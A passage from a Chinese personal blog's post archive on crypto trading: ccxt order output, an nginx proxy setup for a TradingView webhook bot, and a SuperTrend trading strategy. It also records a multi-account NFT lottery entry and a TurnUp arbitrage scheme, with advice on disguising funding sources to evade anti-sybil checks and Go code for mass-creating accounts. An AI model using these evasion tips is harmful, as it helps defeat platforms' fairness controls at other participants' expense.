&#x27;type&#x27;: None,</span><br><span class="line">		&#x27;side&#x27;: None,</span><br><span class="line">		&#x27;takerOrMaker&#x27;: None,</span><br><span class="line">		&#x27;price&#x27;: 25.54,</span><br><span class="line">		&#x27;amount&#x27;: 0.5,</span><br><span class="line">		&#x27;cost&#x27;: 12.77,</span><br><span class="line">		&#x27;fee&#x27;: &#123;</span><br><span class="line">			&#x27;cost&#x27;: 0.0005,</span><br><span class="line">			&#x27;currency&#x27;: &#x27;CAKE&#x27;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;],</span><br><span class="line">	&#x27;fees&#x27;: [&#123;</span><br><span class="line">		&#x27;cost&#x27;: 0.0005,</span><br><span class="line">		&#x27;currency&#x27;: &#x27;CAKE&#x27;</span><br><span class="line">	&#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ftx</span><br><span class="line">&#123;</span><br><span class="line">	&#x27;info&#x27;: &#123;</span><br><span class="line">		&#x27;id&#x27;: &#x27;87609981695&#x27;,</span><br><span class="line">		&#x27;clientId&#x27;: None,</span><br><span class="line">		&#x27;market&#x27;: &#x27;BNB-PERP&#x27;,</span><br><span class="line">		&#x27;type&#x27;: &#x27;market&#x27;,</span><br><span class="line">		&#x27;side&#x27;: &#x27;buy&#x27;,</span><br><span class="line">		&#x27;price&#x27;: None,</span><br><span class="line">		&#x27;size&#x27;: &#x27;0.1&#x27;,</span><br><span class="line">		&#x27;status&#x27;: &#x27;new&#x27;,</span><br><span class="line">		&#x27;filledSize&#x27;: &#x27;0.0&#x27;,</span><br><span class="line">		&#x27;remainingSize&#x27;: &#x27;0.1&#x27;,</span><br><span class="line">		&#x27;reduceOnly&#x27;: False,</span><br><span class="line">		&#x27;liquidation&#x27;: None,</span><br><span class="line">		&#x27;avgFillPrice&#x27;: None,</span><br><span class="line">		&#x27;postOnly&#x27;: False,</span><br><span class="line">		&#x27;ioc&#x27;: True,</span><br><span class="line">		&#x27;createdAt&#x27;: &#x27;2021-10-14T04:03:51.958018+00:00&#x27;,</span><br><span class="line">		&#x27;future&#x27;: &#x27;BNB-PERP&#x27;</span><br><span class="line">	&#125;,</span><br><span class="line">	&#x27;id&#x27;: &#x27;87609981695&#x27;,</span><br><span class="line">	&#x27;clientOrderId&#x27;: None,</span><br><span class="line">	&#x27;timestamp&#x27;: 1634184231958,</span><br><span class="line">	&#x27;datetime&#x27;: &#x27;2021-10-14T04:03:51.958Z&#x27;,</span><br><span class="line">	&#x27;lastTradeTimestamp&#x27;: None,</span><br><span class="line">	&#x27;symbol&#x27;: &#x27;BNB-PERP&#x27;,</span><br><span class="line">	&#x27;type&#x27;: &#x27;market&#x27;,</span><br><span class="line">	&#x27;timeInForce&#x27;: None,</span><br><span class="line">	&#x27;postOnly&#x27;: False,</span><br><span class="line">	&#x27;side&#x27;: &#x27;buy&#x27;,</span><br><span class="line">	&#x27;price&#x27;: None,</span><br><span class="line">	&#x27;stopPrice&#x27;: None,</span><br><span class="line">	&#x27;amount&#x27;: 0.1,</span><br><span class="line">	&#x27;cost&#x27;: None,</span><br><span class="line">	&#x27;average&#x27;: None,</span><br><span class="line">	&#x27;filled&#x27;: 0.0,</span><br><span class="line">	&#x27;remaining&#x27;: 0.1,</span><br><span class="line">	&#x27;status&#x27;: &#x27;open&#x27;,</span><br><span class="line">	&#x27;fee&#x27;: None,</span><br><span class="line">	&#x27;trades&#x27;: None</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://ccxt.readthedocs.io/en/latest/manual.html#orders">https://ccxt.readthedocs.io/en/latest/manual.html#orders</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211014134717.png" alt="20211014134717" /></p>
<p>看文档可知，尽量不要用info key里面的内容，这里面是交易所返回的原始内容，<code>ccxt</code>会解析然后放在其他一级的key，会更具通用性.</p>
<hr />
<h1>Nginx配置:</h1>
<h2 id="查看配置文件路径">查看配置文件路径:</h2>
<p>使用<code>nginx</code>的<code>-t</code>参数进行配置检查，即可知道实际调用的配置文件路径及是否调用有效。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@foolisheddy ~]# nginx -t</span><br><span class="line">nginx: the configuration file /etc/nginx/nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file /etc/nginx/nginx.conf test is successful</span><br></pre></td></tr></table></figure>
<p>查看<code>/etc/nginx/nginx.conf </code>,可能包含了其他配置文件<code>include /etc/nginx/conf.d/*.conf;</code></p>
<h2 id="添加路由转发">添加路由转发:</h2>
<p>添加一段<code>location</code>,访问后转发到本地的flask api上。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /tradingview/ &#123;</span><br><span class="line">            proxy_pass       http://127.0.0.1:10086/tradingview;</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">            proxy_set_header Host $host;</span><br><span class="line">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="nginx操作">nginx操作:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">systemctl status nginx</span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">systemctl restart nginx </span><br></pre></td></tr></table></figure>
<hr />
<h1>Bug:</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211014135626.png" alt="20211014135626" /></p>
<p>tradingview会在有bug信号的时候，多次触发我的api</p>
<p>可能的解决方案:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>修改tradingview对应策略</p>
</li>
<li class="lvl-2">
<p>发送信号设置</p>
</li>
<li class="lvl-2">
<p>我这边手动处理</p>
</li>
</ul>
<p>暂时不处理，先记录一下</p>
<hr />
<h1>Summary:</h1>
<p>做合约交易的话，我自己还不是很有经验，可能后面经验增加or回测多次后能再优化策略吧。<br />
3倍5倍低倍杠杠我理解成 借钱抄底 哈哈</p>
<p>有一些点后期可能需要优化:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>保证金</p>
</li>
<li class="lvl-2">
<p>强平价</p>
</li>
<li class="lvl-2">
<p>如何止损</p>
</li>
<li class="lvl-2">
<p>仓位大小</p>
</li>
<li class="lvl-2">
<p>消息面</p>
</li>
</ul>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://tokentax.co/blog/best-crypto-trading-bot/">The Best Crypto Trading Bots On the Market | TokenTax</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/ccxt/ccxt/issues/6740">Unable To create Limit orders on FTX</a></p>
</li>
<li class="lvl-2">
<p><a href="https://help.ftx.us/hc/en-us/articles/360043580173-Advanced-Order-Types">FTX 高级订单类型</a></p>
</li>
<li class="lvl-2">
<p><a href="https://ccxt.readthedocs.io/en/latest/manual.html#orders">ccxt#orders</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-SuperTrend指标_现货交易脚本</title>
    <url>/2021/48779.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>无意中看到这个<a href="https://youtu.be/yPQYHxwfC1g">视频</a>，有介绍到tradingview这个网站和SuperTrend这个指标,看起来还不错,尝试写个简单的交易脚本试试水。</p>
<hr />
<h1>SuperTrend指标:</h1>
<h2 id="简介">简介:</h2>
<p>SuperTrend指标主要用于为投资者提供价格上涨或下跌的范围</p>
<p>该指标中当产品价格位于绿色线上方时，认为价格处于上涨行情中；</p>
<p>当价格位于红色线下方时，则认为当前的价格处于下跌行情</p>
<blockquote>
<p>简单的说,会给出<code>Buy</code>或者<code>Sell</code>信号</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/8ECBDBBC-A854-461F-A069-7A54DFE82690.png" alt="8ECBDBBC-A854-461F-A069-7A54DFE82690" /></p>
<h2 id="原理">原理:</h2>
<p><strong>原理是判断收盘价是否突破ATR通道（通道 = 均价上下n倍ATR）</strong></p>
<blockquote>
<p>Todo:还未完全理解hhh，后续补补</p>
</blockquote>
<h2 id="我的理解">我的理解:</h2>
<hr />
<h3 id="是否可以按照信号进行交易">是否可以按照信号进行交易?</h3>
<blockquote>
<p><strong>一般来说，这个指标不用于判断进场信号，但买入价位可以在绿线上方寻找，而卖出价位则可以在红线下方寻找。</strong></p>
</blockquote>
<p>如果严格按照<code>Buy</code>或者<code>Sell</code>信号去执行交易的话,效果可能不会很好。</p>
<p>很有可能会在相邻的信号时，<code>Buy</code>信号的价格比<code>Sell</code>信号要高</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/5DC72757-B5E7-4E13-B371-10A557367EE9.png" alt="5DC72757-B5E7-4E13-B371-10A557367EE9" /></p>
<p>例如发送了<code>Buy</code>信号,最理想的情况当然是连续的Green的K棒</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/C1843CAA-777B-46DD-B03E-8647D9D13C73.png" alt="C1843CAA-777B-46DD-B03E-8647D9D13C73" /></p>
<p>也有可能,随后就遇到红色的K棒</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/6F4D976F-F12B-473A-A6AC-B9DE5ED5A83B.png" alt="6F4D976F-F12B-473A-A6AC-B9DE5ED5A83B" /></p>
<p>所以嘛,指标只能作为参考,当然也和你的交易周期有关(看K棒的周期)。</p>
<hr />
<h3 id="信号发送频率">信号发送频率?</h3>
<p>跟你看线设置的周期有关:</p>
<p>如果设置<code>1分钟</code>,那么信号频率会很高,可能几分钟就一次</p>
<p>如果设置<code>4小时</code>,那么信号频率会很低,可能要好几天一次,胜率可能会高很多。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/D7DB9AF1-26AC-4D78-B645-701E5B39024B.png" alt="D7DB9AF1-26AC-4D78-B645-701E5B39024B" /></p>
<hr />
<h1>交易脚本:</h1>
<h2 id="策略">策略:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>选择一个交易周期:45mins</p>
</li>
<li class="lvl-2">
<p><code>Buy</code>信号发出,很可能处于上涨行情,执行市价买入</p>
</li>
<li class="lvl-2">
<p>设置收益率5%,执行限价卖出</p>
</li>
<li class="lvl-2">
<p>暂不设置止损,选择一个我认为比较好的投资标的(币):<code>cake</code>，如果卖不出就让它套着</p>
</li>
<li class="lvl-2">
<p>比较适合小熊行情，这样就算被套住，也成本不高</p>
</li>
</ul>
<h2 id="流程图">流程图:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/5CFD73E4-C26C-41D5-9635-68A71FBBB2B9.png" alt="5CFD73E4-C26C-41D5-9635-68A71FBBB2B9" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>自己提供一个api,由tradingview进行发送<code>Buy</code>信号触发</p>
</li>
<li class="lvl-2">
<p>触发后,市价买入x数量的币</p>
</li>
<li class="lvl-2">
<p>设置一个止盈收益率为5%限价卖单</p>
</li>
<li class="lvl-2">
<p>另外脚本监控限价卖单是否成功卖出</p>
</li>
<li class="lvl-2">
<p>以上每一步都设置tg提醒，入库记录</p>
</li>
<li class="lvl-2">
<p>暂不设置止损</p>
</li>
</ul>
<h2 id="效果-2">效果:</h2>
<p>tradingview设置alert,设置webhook</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20210926131021.png" alt="20210926131021" /></p>
<p>市价买入:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/AB2C4958-CB89-42EB-A5CF-89826075AEE7.png" alt="AB2C4958-CB89-42EB-A5CF-89826075AEE7" /></p>
<p>限价卖出:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/08095169-9D4A-493F-B992-697B6F3E56CB.png" alt="08095169-9D4A-493F-B992-697B6F3E56CB" /></p>
<h2 id="Todo">Todo:</h2>
<p>目前是初步尝试,跑一个月看看，后面再持续优化一下以下几个参数</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>仓位</p>
</li>
<li class="lvl-2">
<p>交易周期</p>
</li>
<li class="lvl-2">
<p>止盈收益率</p>
</li>
</ul>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://zhuanlan.zhihu.com/p/145064506">SuperTrend V.1 超级趋势线系统</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.laohuiyou.com/baike/970.html">外汇技术指标：SuperTrend指标</a></p>
</li>
<li class="lvl-2">
<p><a href="https://tw.tradingview.com/">https://tw.tradingview.com/</a></p>
</li>
<li class="lvl-2">
<p><a href="https://youtu.be/yPQYHxwfC1g">https://youtu.be/yPQYHxwfC1g</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-TinFunNFT参加公售抽奖记录</title>
    <url>/2024/55776.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>多号参与了TinFunNFT的公售抽奖。最后战果:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>预备了57个号,实际参与的是37个号</p>
</li>
<li class="lvl-2">
<p>白号约30个</p>
</li>
<li class="lvl-2">
<p>大号(余额多,注册时间早，在链上有很多交互记录)中了1个</p>
</li>
<li class="lvl-2">
<p>白号(在eth链上没有交互记录)30个,中了1个</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240112184133.png" alt="20240112184133" /><br />
活动结束后，把一些环节给记录、梳理一下，方便下次更高效的冲。</p>
<h1>TinFunNFT公售规则:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>存入：公开销售开放期间，单钱包可以存入一次最低0.1ETH，最高0.2ETH参与抽奖。</p>
</li>
<li class="lvl-2">
<p>开奖：公开销售结束后，天方将进行抽奖，并公布中奖结果，每个钱包最多可中奖2个NFT。</p>
</li>
<li class="lvl-2">
<p>空投：若用户中奖，天方将在结果公布后，与白名单销售预定的NFT将择日进行统一空投。</p>
</li>
<li class="lvl-2">
<p>退款：若用户未中奖，在空投完成后可以领取退款。</p>
</li>
<li class="lvl-2">
<p>⏰发售时间 :<code>2024年1月7日 11:00 UTC+8 至 2024年1月8日 11:00 UTC+8</code> , 持续时间：24小时</p>
</li>
</ul>
<h1>涉及到的操作环节:</h1>
<p>相关操作关键词: 转账，质押，取款，归集<br />
关键词: 预估gas fee、多地址管理、批量查询、发送、归集eth、批量与dapp或合约地址交互</p>
<h2 id="Distribute-ETH">Distribute ETH:</h2>
<p>可以使用<code>https://disperse.app/</code>进行分发,但它分发代币的合约是被大家熟知的，为了防女巫最好还是自建一个类似的dapp出来，这样eth的来源地址就比较独立，不好查。<br />
或者是得想想有没更好的办法,使得eth来源的地址不是唯一且相同的。例如通过交易所或通过创建合约销毁合约的方式…etc</p>
<p>给每个小号还得多预留一些eth作为gas fee,预估gas fee的时候不能太保守，免得遇到gas war时才发现每个号的gas fee不足，到时候就很尴尬了。</p>
<h2 id="Deposit-dapp">Deposit dapp:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240112185615.png" alt="20240112185615" /><br />
参加质押抽奖的时间给了1天的时间，时间是比较充裕的。<br />
当天想着晚上有空再去操作，但其实在8am开始公售时，当时的gas fee很低，是参与的好timing。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240112190245.png" alt="20240112190245" /></p>
<p>晚上再去参与的时候,gas fee平均都在30左右,如果在20以下去参与，手续费相当于是打个6、7折左右。<br />
下次参与，不管是什么Chain，都可以通过前几天GasFee的平均情况，综合判断在哪个gas价格进入比较合适。</p>
<p>当天可以关注一下有没好兄弟在github share脚本出来，当时就是看到了脚哥star了一个仓库<code>https://github.com/qzz0518/tianfang</code>。<br />
实际用的时候需要简单的对脚本进行一下code review，避免里面留有后门。<br />
晚上2am我用来批量deposit的时候，脚本运行报错，后面太晚了，懒得去debug了，只能粗暴的进行手工操作。<br />
质押操作的话，30个号通过metamask钱包一个个导入，再一个个切换去执行质押操作，花费的时间大约是30到40mins，时间可控，但有点累。<br />
30个号还好，如果是更多号，那必须得有脚本or其他批量的思路支持，不然真搞不过来。</p>
<h2 id="查询中奖情况">查询中奖情况:</h2>
<blockquote>
<p>天方开奖了…速查</p>
<p>查询链接：<a href="http://api.tinfun.com/v1/ticket/%E9%99%84%E4%B8%8A%E4%BD%A0%E7%9A%84evm%E5%9C%B0%E5%9D%80">api.tinfun.com/v1/ticket/附上你的evm地址</a></p>
</blockquote>
<p>想用burpsuite直接替换address,然后重放。结果有cloudfare防护，只能一个个curl。</p>
<h2 id="提取未中奖的eth">提取未中奖的eth:</h2>
<p><code>https://github.com/qzz0518/tianfang</code>脚本更新后，新增了提取收款的功能，依然code review后，简单测试一两个号，能够正常提取回eth后。<br />
把所有的号的eth批量提取回来。</p>
<h2 id="归集eth">归集eth:</h2>
<p>批量查询余额可以使用这个<a href="https://mct.xyz/batch-query-balance">工具</a>。但批量转账涉及到自己的私钥时，基于安全起见得用自写脚本。修改了一下之前批量转账的script,后面就可以用了。<br />
如果提交的交易对时效性要求不高,我觉得可以批量以gas单价为20左右的(当天gas平均值较低的价格)去提交交易，等以太坊网络不忙的时候，矿工就会打包这类的交易，多号的规模下可以省下不少成本。</p>
<h2 id="统计成本与收益">统计成本与收益:</h2>
<p>早期参与这类热门项目的抽奖，基本上中了就能赚，最差是回本。</p>
<h2 id="女巫规则">女巫规则:</h2>
<blockquote>
<p>天方销售总额为25477.4 ETH，总地址数量为133538个，公售总奖池NFT数量为4347个（其中包含剩余白名单数量147个NFT）；<br />
⚖️基于优化所有参与者的抽奖体验，并尽可能保证用户相对公平的抽奖条件，天方根据以下几个维度：</p>
<p><strong>钱包活跃度、钱包余额、钻石手玩家特征以及风控规则</strong>，将所有参与地址对应分配至 4 个奖池，每一票（0.1ETH）都分配了一个唯一的抽奖编号，通过 ChainLink VRF 链上随机生成最终中奖编号，链上可查。</p>
</blockquote>
<blockquote>
<p>24912.1e抢4200个资格、平均中奖率 1.74%、5.7e中1（57中1）<br />
实际：<br />
编号 0~4562  中1500个<br />
编号 4563~13800 中1500个<br />
编号 13800~140110 中1500个<br />
编号 140110~249121 中1000个</p>
</blockquote>
<blockquote>
<p>中奖率第一档 4562个 32.88%<br />
第二挡 9237个 16.23%<br />
第三档 126310个 1.18%<br />
第四档 235320个 0.42%</p>
</blockquote>
<p>简而言之，项目方的规则偏向真实用户、大户，这类的号中奖率高。批量的白号中奖率设置得比较低。<br />
女巫与反女巫的关系跟传统的爬虫和反爬虫的对抗思路类似，了解、收集、积累各类项目方的女巫规则后，后续可以避免号被筛掉，也可以为后面的精品号精撸打下一些基础。</p>
<h1>inspire:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>操作得更加专业化,往精撸的方向发展</p>
</li>
<li class="lvl-2">
<p>了解别人更加高级的操作方法，例如<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240112191515.png" alt="20240112191515" /></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-TurnUp_AntiBot_Arbitrage</title>
    <url>/2024/41454.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240221133531.png" alt="20240221133531" /><br />
turnup游戏中,有两个资产：<code>key</code>和<code>lfg</code>，其中围绕<code>key</code>的盈利路径可以获得matic，快速盈利or回本。<br />
每个游戏账号都有对应的<code>key</code>,多人买的话,<code>key</code>就会涨。反之，多人卖这个<code>key</code>就会跌。<br />
一开始是想研究,如何在别人创建新号时，第一时间低成本的买入一把<code>key</code>,这相当于建了一个老鼠仓，成本在零点几个matic。<br />
如果买中一个真实/潜力玩家，那最后把<code>key</code>卖掉后，可以获得很多倍的利润。</p>
<p>在研究过程中发现，早有一个机器人在某些条件满足的情况下，他就会第一时间买入，速度非常快。<br />
如果还去跟他开发同类型的机器人，大概率会卷不过他。<br />
该bot的行为特征很像冲开盘的机器人，遂产生割机器人的想法。</p>
<blockquote>
<p>先研究下有无套利的空间。</p>
</blockquote>
<h1>套利可行性分析:</h1>
<h2 id="初始案例">初始案例:</h2>
<p>钓鱼账号1: guest-18397811<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240128161646.png" alt="20240128161646" /><br />
一开始可以发现，一创建账号就会有多个机器人买入，这样最后卖出key就会有利润。</p>
<h2 id="套利Example1">套利Example1:</h2>
<p>Guest-18443511:<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240128204645.png" alt="20240128204645" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240128204733.png" alt="20240128204733" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>被bot买了2把,成本81(余额)+0.605Matic(买6把初始创建俱乐部的钥匙)</p>
</li>
<li class="lvl-2">
<p>最终总余额81.736 matic</p>
</li>
<li class="lvl-2">
<p>差值:0.131 matic ,约保本</p>
</li>
</ul>
<h2 id="套利Example2">套利Example2:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240128222555.png" alt="20240128222555" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>被bot买了2把</p>
</li>
<li class="lvl-2">
<p>成本81(余额)+0.605Matic(买6把初始创建俱乐部的钥匙)</p>
</li>
<li class="lvl-2">
<p>最终总余额81.736 matic</p>
</li>
<li class="lvl-2">
<p>差值:0.131 matic ,约保本</p>
</li>
</ul>
<h2 id="套利Example3">套利Example3:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240129141340.png" alt="20240129141340" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>被bot买了2把</p>
</li>
<li class="lvl-2">
<p>成本50.9(余额)+1.54Matic(买8把初始创建俱乐部的钥匙)</p>
</li>
<li class="lvl-2">
<p>最终总余额52.15404409 MATIC</p>
</li>
<li class="lvl-2">
<p>差值:-0.286 matic, 亏本</p>
</li>
</ul>
<h2 id="套利Example4">套利Example4:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240129182751.png" alt="游戏activity截图" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240129183409.png" alt="20240129183409" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>成本(余额101)+ 0.33Matic(买5把初始钥匙)</p>
</li>
<li class="lvl-2">
<p>被bot买了5把</p>
</li>
<li class="lvl-2">
<p>最终总余额 102.31MATIC</p>
</li>
<li class="lvl-2">
<p>差值: 0.98matic, 盈利</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240129195458.png" alt="okx盈利图" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>okx交易所差值: + 1.31matic</p>
</li>
</ul>
<h2 id="套利Example5">套利Example5:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240129195227.png" alt="游戏activity截图" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>101(初始转入余额)+ 0.605(买6把初始钥匙)</p>
</li>
<li class="lvl-2">
<p>被bot买了4把</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240129194635.png" alt="binance盈利图" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>binance交易所差值: + 1.94matic</p>
</li>
</ul>
<h2 id="数据分析BotInfoList">数据分析BotInfoList:</h2>
<p>简单的对bot的账户,matic地址进行数据分析。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// @title 查询自动购买钥匙机器人的账号信息</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(autoBuyKeyBotList *AutoBuyKeyBotList)</span></span> QueryBotInfo(response HistoryFriendsJson) &#123;</span><br><span class="line">	allConfig := config.GetConfig()</span><br><span class="line">	<span class="keyword">for</span> _, logs := <span class="keyword">range</span> response.Data.Logs &#123; <span class="comment">// logs 对自己key的购买记录</span></span><br><span class="line">		<span class="keyword">var</span> newBot AutoBuyKeyBotInfo <span class="comment">// 初始化一个Bot Struct</span></span><br><span class="line">		<span class="comment">//if logs.LogType == 1 &#123;</span></span><br><span class="line">		<span class="keyword">if</span> logs.LogType != <span class="number">2</span> &#123; <span class="comment">// 先只关注买的情况</span></span><br><span class="line">			<span class="keyword">if</span> logs.TxData.UserID != logs.TxData.KeyID &#123; <span class="comment">// 排除自己买自己的情况</span></span><br><span class="line">				newBot.UserID = <span class="type">uint</span>(logs.TxData.UserID)</span><br><span class="line">				<span class="comment">// userId 通过API:user_info 查询账号信息</span></span><br><span class="line">				jsonData2 := GetUserInfoJsonData(newBot.UserID, allConfig.TurnUpToken)</span><br><span class="line">				userInfoRes := ParseUserInfoJsonData(jsonData2)</span><br><span class="line"></span><br><span class="line">				newBot.WalletAddr = userInfoRes.Data.WalletAddr</span><br><span class="line">				<span class="comment">// 查询matic余额</span></span><br><span class="line">				newBot.MaticBalance = GetMaitcBalance(allConfig.MaticUrl, newBot.WalletAddr)</span><br><span class="line">				newBot.TxType = <span class="type">uint</span>(logs.TxData.TxType)</span><br><span class="line">				newBot.Amount = <span class="type">uint</span>(logs.TxData.Amount)</span><br><span class="line">				newBot.DisplayName = logs.TxData.UserProfile.DisplayName</span><br><span class="line">				newBot.AccountName = logs.TxData.UserProfile.AccountName</span><br><span class="line">				newBot.ProfileDeepLink = logs.TxData.UserProfile.ProfileDeepLink</span><br><span class="line">				newBot.TotalPrice = logs.TxData.TotalPrice</span><br><span class="line">				newBot.Seconds = <span class="type">uint</span>(logs.TxData.Time)</span><br><span class="line">				autoBuyKeyBotList.BotList = <span class="built_in">append</span>(autoBuyKeyBotList.BotList, newBot)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>userId</th>
<th>displayName</th>
<th>AccountName</th>
<th>MaticBalance</th>
<th>持有key数量</th>
<th>Twitter</th>
<th>Address</th>
</tr>
</thead>
<tbody>
<tr>
<td>8006611</td>
<td>aramy</td>
<td>AramYangOnly</td>
<td>120</td>
<td>24</td>
<td>AramYangOnly</td>
<td>0x0B27C90fc52D5A454C4Baf27e22BdF18F8f3C9A9</td>
</tr>
<tr>
<td>241211</td>
<td>punauk</td>
<td>LettaTrisha</td>
<td>3334</td>
<td>93</td>
<td>LettaTrisha</td>
<td>0xA3BB2A4a4fD70b71c23291736028E17a278B60B8</td>
</tr>
<tr>
<td>12719211</td>
<td>SDougt|R</td>
<td>DogSilit</td>
<td>0.065</td>
<td>430</td>
<td>DogSilit</td>
<td>0xCbEF6843BE256Fc0AfC8c7f27371b8055C3B0a2b</td>
</tr>
</tbody>
</table>
<p>another bot: 0x82758D26234F8424d0A682E363f2Cba2DBf4e567</p>
<p>名为<code>punauk</code>的机器人,matic余额多，实力强劲。</p>
<h2 id="套利可行性分析总结">套利可行性分析总结:</h2>
<p>经过多次手工测试+数据分析，得出一些结论</p>
<p>bot的行为特征是:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>买入来自交易所(okx、binance)提现的地址</p>
</li>
<li class="lvl-2">
<p>链上地址直接转账，bot不会买入</p>
</li>
<li class="lvl-2">
<p>有的bot对初始的matic余额有偏好,需要一定初始的matic余额</p>
</li>
</ul>
<p>只要有一个bot买入一把key，那就存在利润。<br />
再经过一些测试，实际可行的套利操作路径:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>创建初始账户，一次购入8把<code>key</code>(买9把的话,bot就不会买入,key的成本过高了)</p>
</li>
<li class="lvl-2">
<p>会有一个名为<code>punauk</code>的bot会买入一把<code>key</code></p>
</li>
<li class="lvl-2">
<p>直接卖出7把<code>key</code></p>
</li>
<li class="lvl-2">
<p>利润空间为 0.3~0.4matic</p>
</li>
</ul>
<h1>批量套利步骤:</h1>
<p>经过优化后的批量套利操作:</p>
<ol>
<li class="lvl-3">
<p>批量生成无限邮账户</p>
</li>
<li class="lvl-3">
<p>无限邮批量创建10个游戏账户</p>
</li>
<li class="lvl-3">
<p>okx设置matic提现白名单，批量提现20matic到每个游戏账户</p>
</li>
<li class="lvl-3">
<p>每个游戏账户购买8把<code>key</code></p>
</li>
<li class="lvl-3">
<p>等名为<code>punauk</code>的bot买入一把<code>key</code>后</p>
</li>
<li class="lvl-3">
<p>一次性卖出7把<code>key</code></p>
</li>
<li class="lvl-3">
<p>批量导出私钥,利用mct网站的批量归集功能，发回okx交易所</p>
</li>
</ol>
<p>10个游戏账户为一批，依此循环执行。</p>
<h2 id="批量创建10个游戏账户">批量创建10个游戏账户:</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestGenerateEmailAccount</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">	baseNum := <span class="type">uint</span>(<span class="number">1740</span>)</span><br><span class="line">	amount := <span class="number">100</span></span><br><span class="line">	Generate2925EmailAccount(amount, baseNum)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240221140840.png" alt="20240221140840" /></p>
<h2 id="批量提现matic">批量提现matic:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240221141019.png" alt="20240221141019" /><br />
